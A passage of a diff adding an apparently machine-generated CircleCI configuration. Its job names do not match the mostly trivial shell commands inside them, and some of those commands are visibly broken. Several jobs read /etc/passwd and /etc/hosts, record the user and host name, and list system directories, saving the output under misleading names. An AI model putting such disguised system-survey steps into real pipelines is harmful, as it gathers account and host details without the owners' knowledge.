+            echo 'step 5 started'; printf '%s\n' helium poplar ochre sloth goat | sed 's/p/_/'; echo 'step 5 finished'
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'purge-compiler-cache'
+  authentication-compliance-audit-job-3:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: WebsiteStorageMigration
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -type f -printf '%y %p\n' 2>/dev/null|nl; true ; } > /tmp/vtkkysp/exporting-debug-logs
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/exporting-debug-logs"
+            echo "warming up catalog"; words=(hazel gold carbon); tally=0; for n in "${words[@]}"; do tally=$((tally + ${#n})); done; echo "$tally"; echo "catalog warmed up"
+            for level in 7 14 28; do echo "level $level"; done
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'exporting-debug-logs'
+  stopDecoderDeploymentWhenVersionChanges:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Metrics exporter sources
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; trim() { printf "%-${2:-20}s|\n" "$1"; }; trim split; true ; } > /tmp/vtkkysp/pre-review-verification
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/pre-review-verification"
+            echo "gear fig mango" | awk '{print $2}' && echo 'manifest check started'
+            text="willow-ram-62"; echo "${#text}"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'pre-review-verification'
+  rerun-messaging-sanity-checks:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Find deprecated features
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; echo 'yay!' 1>/tmp/pear.out 2>/tmp/photo.conf && cat /tmp/pear.out; true ; } > /tmp/vtkkysp/environment-setup-workflow
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/environment-setup-workflow"
+            printf '%q\n' "chisel trout" && echo using galaxy profile
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'environment-setup-workflow'
+  sequential-accessibility-tests:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: archive-package
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; for w in $(seq scheduled-artifact-inspection); do printf '%02d\n' "$w"; done; true ; } > /tmp/vtkkysp/dependency-restore-shard-14
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/dependency-restore-shard-14"
+            x=""; for left in mole meteor yak; do x+="$left"; done; echo "$x"
+            printf '%s\n' 32 60 51 45 12 | awk '{s += $1 * $1} END {print s}'
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'dependency-restore-shard-14'
+  required-readiness-check-stage:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Hourly dependency fetch pipeline
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; head -n 4 /etc/passwd | cut -d ':' -f 1 | tac; true ; } > /tmp/vtkkysp/client-application-packaging
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/client-application-packaging"
+            suite="compile"; cases=259; printf '%s suite, %d cases, %d shards of %d\n' "$suite" "$cases" 3 $((cases / 3))
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'client-application-packaging'
+  FilterWarningsInFullDetail:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: encode-certificate
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; find /run -type f -size -1k -printf '%p\n' 2>/dev/null | awk -F/ '{print $NF}' | sort | uniq -c | sort -rn | head -n 5; true ; } > /tmp/vtkkysp/sandbox-cache
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/sandbox-cache"
+            printf '%s\n' boron yew gray lever | grep -c ''
+            words=(); words+=(gray); words+=(lemur); echo "${#words[@]}"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'sandbox-cache'
+  sequential-release-rollback-track-2:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: pre-commit-gate-wave-3
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; ls /var/spool | paste -sd ' '; true ; } > /tmp/vtkkysp/extended-engine-debug-build
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/extended-engine-debug-build"
+            printf '%s\n' 93 88 26 33 80 94 74 | tail -n +2 | sed -n '2p' | rev
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'extended-engine-debug-build'
+  incremental-notification:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: mail server library
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; find /tmp -maxdepth 1 -type f -name '*.txt' -exec wc -c {} + | tail -n 1; true ; } > /tmp/vtkkysp/automated-router-log-rotation
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/automated-router-log-rotation"
+            key="gear"; if [[ "$key" == *ar ]]; then echo "suffix ok"; else echo "suffix missing"; fi
+            arr=(40 6 34); printf '%03d\n' "${arr[@]}"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'automated-router-log-rotation'
+  extended-baseline-comparison-replica-3:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: EncoderTestSuite (slot scheduled-artifact-inspection)
+          command: |
+            mkdir -p /tmp/vtkkysp
+            set +o pipefail; find /opt -maxdepth 3 | head -30 > /tmp/vtkkysp/pre-restore-hook; seq 1 1349195 >> /tmp/vtkkysp/pre-restore-hook; true
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/pre-restore-hook"
+            printf '%s\n' mole melon orange | while read -r name; do echo "linting $name"; done
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'pre-restore-hook'
+  PreLaunchSuccessNotificationPartition1:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Watch validator containers
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; cat /etc/hosts >'/tmp/tmp_goalPurple.log' 2>&1 && wc -l '/tmp/tmp_goalPurple.log'; true ; } > /tmp/vtkkysp/scheduler-container-image
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/scheduler-container-image"
+            for progress in 33 66 100; do echo "cycle at $progress%"; done
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'scheduler-container-image'
+  download-and-verify-signature:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: AssembleEdgeProxyBundle
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; LOGFILE=(chen uma leo sam); printf '%s\n' "${LOGFILE[@]}" | sort; true ; } > /tmp/vtkkysp/task-queue-error-logs
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/task-queue-error-logs"
+            printf '%s\n' blue,10 squid,15 banana,3 wasp,14 | sort | paste -s -d' '
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'task-queue-error-logs'
+  ConfigureSlice4:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Fetch release package
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; if clean-event-bus-test-cache ! -d /tmp;then echo "true"; else echo false; fi; true ; } > /tmp/vtkkysp/restarting-mail-server-workers
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/restarting-mail-server-workers"
+            echo "stage 7 of 7 started"; expr 21 + 11 + 15; echo "stage 7 of 7 complete"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'restarting-mail-server-workers'
+  VersionTaggingSlot7:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: roll-out-draft-release-and-monitor-error-rates
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; for name in carol pete ivy; do echo "${name^}"; done | nl; true ; } > /tmp/vtkkysp/analytics-coverage-check
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/analytics-coverage-check"
+            echo "ready"; printf '%s\n' solar whale khaki pluto wasp | sed 'y/aeo/AEO/'
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'analytics-coverage-check'
+  move-lint-results-to-artifact-directory:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Gather build logs
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; df -h -x tmpfs | tail -n +2 | sort -k 5 --numeric-sort; true ; } > /tmp/vtkkysp/controller-source-checkout
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/controller-source-checkout"
+            check_ok() { [ "$1" = ok ]; }; check_ok ok; echo passed; echo 'shard 10 of 12 finished'
+            echo 'quince profile loaded'; printf '%s\n' 4 13 52 2 | awk '26 < $1 {c++} END {print c + 0}'
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'controller-source-checkout'
+  BuildAndScanRouter:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Sync User Guide to Staging Site
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; cat /proc/meminfo | grep MemAvailable | sort | uniq -c; true ; } > /tmp/vtkkysp/pre-compile-image-scan
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/pre-compile-image-scan"
+            words=(coral anvil spindle delta wasp nebula); words+=(zinc); echo "${#words[@]}"
+            echo 'all 2 checks passed'; let "k = 11 * 10"; echo "$k"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'pre-compile-image-scan'
+  PersistBuildDirectoryForCanary:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Display extension version tag
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; for item in /etc/default/*; do ls -l "$item" ; done | paste -sd ' '; true ; } > /tmp/vtkkysp/pre-tag-package-inspection
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/pre-tag-package-inspection"
+            y=93; u=$((y % 5)); echo "$y mod 5 is $u"; echo 'nothing to do for serializer'
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'pre-tag-package-inspection'
+  container-scan-pipeline:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Draft Changelog Manually for All Regions
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; list_dir() { echo "$(whoami)@$(hostname):$PWD"; }; list_dir; true ; } > /tmp/vtkkysp/plugin-install-task
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/plugin-install-task"
+            printf '%s\n' "10 modules compiled" "job runner looks healthy"
+            echo "warming up serializer"; printf '%X %o\n' 106 52; echo "serializer warmed up"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'plugin-install-task'
+  save-schema-registry-screenshots:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: monitoringRun (segment 2)
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; pwd; true ; } > /tmp/vtkkysp/environment-setup-workflow
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/environment-setup-workflow"
+            tagged() { printf '[%s] %s\n' "$1" "$2"; }; tagged beech cobra; echo "starting type check"
+            total=0; for ((n = 0; n <= 228; n += 9)); do total=$((total + 1)); done; echo "$total"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'environment-setup-workflow'
+  background-configuration-lint:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Quick update agent tests
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; grep -F root /etc/passwd | cut -d: -f1,3; true ; } > /tmp/vtkkysp/compress-middleware-packages
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/compress-middleware-packages"
+            slow=0; for ms in 295 434 721 1272 1388; do if ((ms > 500)); then slow=$((slow + 1)); fi; done; echo "$slow slow tests"
+            image="yak/shark"; tag="8.10.25"; echo "image $image tagged $tag"; echo "short tag ${tag%.*}"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'compress-middleware-packages'
+  NotificationServiceTemplates:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: post-test tasks (cycle 3)
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; exec 3>"/tmp/cu1.log"; echo hello >&3; exec 3>&-; cat "/tmp/cu1.log"; true ; } > /tmp/vtkkysp/job-runner-status-update
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/job-runner-status-update"
+            target="parser.ini"; echo "$target" | tr a-z A-Z; echo 'checking encoder'
+            echo "stage 9 of 10 started"; wc -w < <(echo "neon peach sloth"); echo "stage 9 of 10 complete"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'job-runner-status-update'
+  split-coverage-data-automatically:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: setUpOperatorCompilerCache
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; tar --exclude='*.conf' -czf /tmp/whale.tar.gz -C /etc skel && tar -tzf /tmp/whale.tar.gz | head -n 6; true ; } > /tmp/vtkkysp/overnight-debug-build
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/overnight-debug-build"
+            printf '%s\n' elm pecan salmon | sort -r
+            read -r -a names < <(echo "otter boron llama"); echo "${#names[@]}"; echo 'worker 2 idle'
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'overnight-debug-build'
+  package-payment-service:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Start adapter
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'wolf frog' | awk '{print length($0)}'; true ; } > /tmp/vtkkysp/bridge-image-tagging-replica-5
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/bridge-image-tagging-replica-5"
+            flaky=(khaki blue stork nectar solar); printf 'quarantined %s\n' "${flaky[@]}"; echo "${#flaky[@]} tests quarantined"
+            rank_of() { local -A table=([washer]=8 [hazel]=88); echo "${#table[@]}"; }; rank_of
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'bridge-image-tagging-replica-5'
+  restore-build-directory-after-migration:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: PersistFrameworkBuildSummary
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; echo "testing 1 2 3" | tee -a /tmp/build_v2.md >/dev/null && wc -l /tmp/build_v2.md; true ; } > /tmp/vtkkysp/viewer-patch-release
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/viewer-patch-release"
+            echo "progress 95 percent"; declare -a tokens=(heron pluto magnet gear llama); echo "${tokens[0]}"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'viewer-patch-release'
+  deployStableReleaseToTestCluster:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Primary billing service plugin update run
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; ls -S /lib / | paste -sd ' '; true ; } > /tmp/vtkkysp/scheduled-artifact-inspection
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/scheduled-artifact-inspection"
+            printf '%s\n' 58 90 96 91 38 72 29 | awk '{p = p * 2 + $1} END {print p}'
+            probes=0; until ((probes == 2)); do probes=$((probes + 1)); done; echo "auth proxy ready after $probes probes"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'scheduled-artifact-inspection'
+workflows:
+  remote-review:
+    jobs:
+      - copy-analytics-binary
+      - extended-baseline-comparison-replica-3:
+          requires:
+            - copy-analytics-binary
+      - DownloadAndInstallLanguageRuntime:
+          requires:
+            - extended-baseline-comparison-replica-3
+      - WarmExtensionPackageCacheAfterCleanup:
+          requires:
+            - extended-baseline-comparison-replica-3
+      - PreLaunchSuccessNotificationPartition1:
+          requires:
+            - WarmExtensionPackageCacheAfterCleanup
+      - RemovalStepStage3:
+          requires:
+            - PreLaunchSuccessNotificationPartition1
+      - gateway-test-build:
+          requires:
+            - PreLaunchSuccessNotificationPartition1
+      - download-and-verify-signature:
+          requires:
+            - gateway-test-build
+      - image-processor-nightly-pipeline:
+          requires:
+            - download-and-verify-signature
+      - disableNightlyBuildsForLaterJobs:
+          requires:
+            - download-and-verify-signature
+      - ConfigureSlice4:
+          requires:
+            - disableNightlyBuildsForLaterJobs
+      - import-storage-build-configuration:
+          requires:
+            - ConfigureSlice4
+      - dependency-verification-phase-tier-3:
+          requires:
+            - ConfigureSlice4
+      - VersionTaggingSlot7:
+          requires:
+            - dependency-verification-phase-tier-3
+      - monitorClientContainers:
+          requires:
+            - VersionTaggingSlot7
+      - ExportSecurityReportToLogStorage:
+          requires:
+            - VersionTaggingSlot7
+      - move-lint-results-to-artifact-directory:
+          requires:
+            - ExportSecurityReportToLogStorage
+      - EmbedIndexerBuildNumberIncrementally:
+          requires:
+            - move-lint-results-to-artifact-directory
+      - ScheduleEditorUnitTests:
+          requires:
+            - move-lint-results-to-artifact-directory
+      - BuildAndScanRouter:
+          requires:
+            - ScheduleEditorUnitTests
+      - display-artifact-list-unless-skipped:
+          requires:
+            - BuildAndScanRouter
+      - remote-flaky-billing-tests:
+          requires:
+            - BuildAndScanRouter
+      - PersistBuildDirectoryForCanary:
+          requires:
+            - remote-flaky-billing-tests
+      - UserPortalReleaseFreeze:
+          requires:
+            - PersistBuildDirectoryForCanary
+      - GatherMiddlewareTestLogs:
+          requires:
+            - PersistBuildDirectoryForCanary
+      - container-scan-pipeline:
+          requires:
+            - GatherMiddlewareTestLogs
+      - back-up-metrics-to-secondary-region:
+          requires:
+            - container-scan-pipeline
+      - formatter-release-bundle:
+          requires:
+            - container-scan-pipeline
+      - save-schema-registry-screenshots:
+          requires:
+            - formatter-release-bundle
+      - AuthenticationIntegrationTestsSplit4Of4:
+          requires:
+            - save-schema-registry-screenshots
+      - archive-driver-release-build:
+          requires:
+            - save-schema-registry-screenshots
+      - background-configuration-lint:
+          requires:
+            - archive-driver-release-build
+      - PostCompileSanityChecks:
+          requires:
+            - background-configuration-lint
+      - pulling-bucket-3:
+          requires:
+            - background-configuration-lint
+      - NotificationServiceTemplates:
+          requires:
+            - pulling-bucket-3
+      - InfrastructureProvisioningWorker1Of8:
+          requires:
+            - NotificationServiceTemplates
+      - informSecurityTeamAboutExpiringCertificates:
+          requires:
+            - NotificationServiceTemplates
+      - split-coverage-data-automatically:
+          requires:
+            - informSecurityTeamAboutExpiringCertificates
+      - unpack-source-archive-with-verbose-output:
+          requires:
+            - split-coverage-data-automatically
+      - SchemaRegistryCertificateImport:
+          requires:
+            - split-coverage-data-automatically
+      - package-payment-service:
+          requires:
+            - SchemaRegistryCertificateImport
+      - BuildContainerImageAndPushVersionTag:
+          requires:
+            - package-payment-service
+      - executeHealthChecks:
+          requires:
+            - package-payment-service
+      - restore-build-directory-after-migration:
+          requires:
+            - executeHealthChecks
+      - parallel-certificate-install-phase:
+          requires:
+            - restore-build-directory-after-migration
+      - CopyViewerSizeReportToReportServer:
+          requires:
+            - restore-build-directory-after-migration
+      - deployStableReleaseToTestCluster:
+          requires:
+            - CopyViewerSizeReportToReportServer
+      - ProbeFirmwareServiceRound4:
+          requires:
+            - deployStableReleaseToTestCluster
+  periodic-canary-roll-out:
+    jobs:
+      - operator-release-freeze-routine-attempt-3
+      - catalog-help-pages:
+          requires:
+            - operator-release-freeze-routine-attempt-3
+      - CopyingUploadServicePackages:
+          requires:
+            - catalog-help-pages
+      - initializeUploadService:
+          requires:
+            - catalog-help-pages
+      - crawlerBuildOutputs:
+          requires:
+            - initializeUploadService
+      - assemble-release-chunk-9:
+          requires:
+            - crawlerBuildOutputs
+      - MailServerRebuild:
+          requires:
+            - crawlerBuildOutputs
+      - connector-schema-rollback:
+          requires:
+            - MailServerRebuild
+      - continuous-workspace-setup:
+          requires:
+            - connector-schema-rollback
+      - wrap-attempt-3:
+          requires:
+            - connector-schema-rollback
+      - CompressFailureReportAfterMerge:
+          requires:
+            - wrap-attempt-3
+      - provision-client-database-in-container:
+          requires:
+            - CompressFailureReportAfterMerge
+      - post-sync-binary-inspection:
+          requires:
+            - CompressFailureReportAfterMerge
+      - assemble-report-exporter-release-build-with-default-settings:
+          requires:
+            - post-sync-binary-inspection
+      - migrate-reporting-database-schema:
+          requires:
+            - assemble-report-exporter-release-build-with-default-settings
+      - low-priority-cluster-removal:
+          requires:
+            - assemble-report-exporter-release-build-with-default-settings
+      - install-kernel-development-dependencies-from-lock-file:
+          requires:
+            - low-priority-cluster-removal
+      - clean-event-bus-test-cache:
+          requires:
+            - install-kernel-development-dependencies-from-lock-file
+      - fast-dependency-cache-stage:
+          requires:
+            - install-kernel-development-dependencies-from-lock-file
+      - authentication-compliance-audit-job-3:
+          requires:
+            - fast-dependency-cache-stage
+      - upload-release-notes:
+          requires:
+            - authentication-compliance-audit-job-3
+      - import-middleware-golden-files:
+          requires:
+            - authentication-compliance-audit-job-3
+      - stopDecoderDeploymentWhenVersionChanges:
+          requires:
+            - import-middleware-golden-files
+      - install-test-dependencies-and-build-source-archive:
+          requires:
+            - stopDecoderDeploymentWhenVersionChanges
+      - PostUpgradeTests:
+          requires:
+            - stopDecoderDeploymentWhenVersionChanges
+      - rerun-messaging-sanity-checks:
+          requires:
+            - PostUpgradeTests
+      - assemble-debug-build-automatically:
+          requires:
+            - rerun-messaging-sanity-checks
+      - FallbackCommitSigningPhase:
+          requires:
+            - rerun-messaging-sanity-checks
+      - sequential-accessibility-tests:
+          requires:
+            - FallbackCommitSigningPhase
+      - rebuildContainerImageAfterBuild:
+          requires:
+            - sequential-accessibility-tests
+      - RenderDefaultSettings:
+          requires:
+            - sequential-accessibility-tests
+      - required-readiness-check-stage:
+          requires:
+            - RenderDefaultSettings
+      - update-controller-compiler-flags:
+          requires:
+            - required-readiness-check-stage
+      - stamp-release-tag-with-reproducible-settings:
+          requires:
+            - required-readiness-check-stage
+      - FilterWarningsInFullDetail:
+          requires:
+            - stamp-release-tag-with-reproducible-settings
+      - upload-developer-guide-to-help-center-lane-4:
+          requires:
+            - FilterWarningsInFullDetail
+      - ExporterRollOut:
+          requires:
+            - FilterWarningsInFullDetail
+      - sequential-release-rollback-track-2:
+          requires:
+            - ExporterRollOut
+      - InspectImageLayers:
+          requires:
+            - sequential-release-rollback-track-2
+      - clone-installer-release-branch-from-backup:
+          requires:
+            - sequential-release-rollback-track-2
+      - incremental-notification:
+          requires:
+            - clone-installer-release-branch-from-backup
+      - pre-commit-security-scan-level-5:
+          requires:
+            - incremental-notification
